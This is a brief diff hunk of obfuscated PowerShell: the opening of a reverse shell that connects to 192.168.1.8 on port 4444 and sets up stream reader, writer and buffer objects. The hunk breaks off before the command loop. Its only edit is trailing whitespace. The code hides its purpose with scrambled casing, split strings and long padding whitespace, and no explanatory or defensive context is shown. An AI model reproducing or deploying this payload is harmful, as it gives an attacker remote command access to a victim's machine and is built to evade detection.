@@ -1,7 +1,7 @@
 $iP=(-join('192.1','68.1.','8'));$pO=4444;                                                                                                                                                                                           
 $tC=(NeW-OBJecT Net.SoCKEtS.tCpcLiENT($iP,$pO));
 $Ns=$tC.GetStREaM();
-$SW=(New-OBJeCT Io.STrEamwRiTER($Ns));
+$SW=(New-OBJeCT Io.STrEamwRiTER($Ns)); 
 $sR=(NEw-ObjECt Io.stReamrEAdEr($Ns));
 $SW.auTOFluSh=$true;
 $By=[Byte[]]::New(1024);$Cm="";
